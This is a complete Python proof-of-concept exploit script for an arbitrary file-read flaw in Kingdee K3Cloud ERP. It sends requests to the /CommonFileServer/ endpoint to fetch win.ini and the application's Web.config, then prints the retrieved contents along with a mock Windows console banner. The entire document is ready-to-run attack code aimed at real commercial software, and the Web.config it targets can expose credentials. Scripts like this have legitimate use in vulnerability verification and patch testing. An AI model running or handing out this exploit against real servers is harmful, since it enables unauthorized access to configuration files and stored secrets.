#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import requests
import urllib3
import sys
import time
import json
import re
from datetime import datetime, timedelta

urllib3.disable_warnings()

def verify(site):
    payloads = ["c:/windows/win.ini", "C%3A%5CProgram%20Files%20%28x86%29%5CKingdee%5CK3Cloud%5CWebSite%5CWeb.config"]
    for payload in payloads:
        burp0_url = site + "/CommonFileServer/" + payload
        burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36", "Connection": "close"}
        r = requests.get(burp0_url, headers=burp0_headers, verify=False)
        if r.status_code == 200:
            return payload, r.text
    return "", ""
    
if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 kingdee-erp-commonfileserver-fileread.py ",target)
    payload, info = verify(target)
    if payload != "":
        print("[+]漏洞存在，读取", payload, "  的文件内容为：", info)
    else:
        print("[-]漏洞不存在")
